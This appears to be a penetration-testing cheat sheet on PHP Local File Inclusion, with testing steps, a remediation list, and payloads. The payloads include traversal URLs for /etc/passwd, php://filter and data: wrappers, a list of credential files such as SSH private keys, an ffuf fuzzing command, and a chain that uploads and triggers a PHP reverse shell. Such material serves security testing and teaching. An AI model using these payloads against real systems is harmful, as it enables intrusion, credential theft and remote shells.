# Local File Inclusion (LFI)

## PHP Vulnerable functions:

### Include_once()

### Include()

### require()

#### Example: http://site.com/index.php?file=/etc/passwd (Linux)

#### http://site.com/index.php?file=/windows/win.ini (Windows)

## LFI Testing

#### 1: GET,POST,COOKIE,HTTP header values

#### 2: Valid input to check web server behavior

#### 3: Invalid inputs

#### 4: Use burpsuite or browser address, not only forms

#### 5: Look for errors while entering invalid input to disclose the current path of the web app (trial and error)

#### 6: Understand input validation and check for filters

#### 7: Inject a valid entry to read sensitive files

## File Inclusion Remediation (Both LFI and RFI)

#### 1: Keep systems, services and web apps updated.

#### 2: Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.

#### 3: Web Application Firewall (WAF)

#### 4: Whitelist/Blacklist file names and locations

#### 5: Disable allow_url_fopen and allow_url_include (PHP)

#### 6: Input validation

#### 7: Allow only protocols and PHP wrappers in need.

### PHP WRAPPERS

#### 1) 

    php://filter/convert.base64-encode/resource=.htaccess

#### 2) 

    php://filter/string.rot13/resource=.htaccess

#### 3) 

    php://filter/string.toupper/resource=.htaccess

#### 4) 

    php://filter/string.tolower/resource=.htaccess

#### 5) 

    php://filter/string.strip_tags/resource=.htaccess

### DATA WRAPPER 

    data:text/plain,<?php phpinfo(); ?>

## Important files to look for:

#### 1) /etc/passwd

#### 2) /home/USER/.ssh/id_rsa

#### 3) /etc/apache2/sites-enabled/000-default.conf

#### 4) /var/www/html/config.php

#### 5) /var/www/html/.htpasswd

## LFI to RCE by calling your uploaded reverse shell

If you have write access on an FTP server, you can upload your reverse shell, then call it with LFI to catch it.

### 1) Upload your reverse shell in a writable FTP share

    put php-reverse-shell.php

### 2) Using LFI, find the FTP configuration file to detect the share that your shell is uploaded.

Enumerate with ffuf

    ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt -t 100 -u http://192.168.158.14/secret_information/?lang=FUZZ -fs 146

Read FTP configuration file

    http://domain.local/vulnerable.php?lang=/etc/vsftpd.conf

You might detect something like

    anon_root=/var/ftp write_enable=YES (If anonymous access is allowed for example.)

### 3) Enjoy your shell

    http://domain.local/vulnerable.php?lang=/var/ftp/pub/php-reverse-shell.php
